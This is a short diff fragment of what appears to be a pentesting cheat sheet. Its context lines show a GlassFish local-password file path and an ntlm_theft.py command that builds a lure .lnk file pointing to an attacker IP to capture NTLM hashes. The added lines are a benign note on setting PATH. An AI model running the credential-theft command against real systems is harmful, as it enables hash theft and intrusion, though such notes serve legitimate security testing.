@@ -115,3 +115,8 @@ glassfish4/glassfish/domains/domain1/config/local-password
 python3 ntlm_theft.py -g lnk -s <ip> -f vault
 ```
 - https://github.com/Greenwolf/ntlm_theft
+---
+# Path variables
+```powershell
+set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
+```
